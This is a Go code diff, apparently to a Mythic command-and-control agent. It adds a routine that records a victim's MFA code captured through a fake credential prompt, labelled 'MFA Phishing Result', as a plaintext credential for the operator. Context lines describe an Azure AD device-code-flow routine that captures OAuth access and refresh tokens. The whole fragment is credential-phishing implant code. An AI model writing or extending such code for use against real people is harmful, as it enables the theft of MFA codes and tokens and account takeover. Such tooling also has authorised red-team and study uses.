@@ -61,6 +61,37 @@ type oauthTokenResponse struct {
 	ErrorDesc    string `json:"error_description"`
 }
 
+// credPromptMFAPhishResult formats the result from a captured MFA code.
+func credPromptMFAPhishResult(code, title, username, platform string) structs.CommandResult {
+	if code == "" {
+		return successResult("User submitted empty code")
+	}
+
+	var sb strings.Builder
+	sb.WriteString("=== MFA Phishing Result ===\n\n")
+	sb.WriteString(fmt.Sprintf("User:     %s\n", username))
+	sb.WriteString(fmt.Sprintf("Code:     %s\n", code))
+	sb.WriteString(fmt.Sprintf("Dialog:   %s\n", title))
+	sb.WriteString(fmt.Sprintf("Platform: %s\n", platform))
+
+	creds := []structs.MythicCredential{
+		{
+			CredentialType: "plaintext",
+			Realm:          "mfa-phish",
+			Account:        username,
+			Credential:     code,
+			Comment:        fmt.Sprintf("credential-prompt mfa-phish capture (%s)", platform),
+		},
+	}
+
+	return structs.CommandResult{
+		Output:      sb.String(),
+		Status:      "success",
+		Completed:   true,
+		Credentials: &creds,
+	}
+}
+
 // credPromptDeviceCodeFlow initiates an Azure AD OAuth Device Code Flow.
 // The user sees a code to enter at https://microsoft.com/devicelogin.
 // This captures OAuth tokens (access + refresh) if the user authenticates,
